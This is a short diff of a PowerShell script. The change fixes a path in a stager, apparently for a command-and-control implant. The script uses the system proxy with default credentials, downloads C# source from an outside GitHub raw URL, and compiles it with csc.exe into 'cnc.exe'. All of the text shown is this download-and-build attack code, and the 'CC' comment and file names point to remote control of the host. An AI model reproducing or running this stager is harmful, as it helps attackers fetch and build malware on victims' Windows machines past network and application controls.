@@ -2,7 +2,7 @@ $b=new-object net.webclient;
 $b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
 
 #Part 1 - CC
-$my_path="C:temp\cexec.cs"
+$my_path="C:\temp\cexec.cs"
 $url='https://raw.githubusercontent.com/FurqanKhan1/D/master/cexec.cs';
 $b.DownloadFile($url, $my_path) ;
 $command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\cnc.exe C:\temp\cexec.cs"
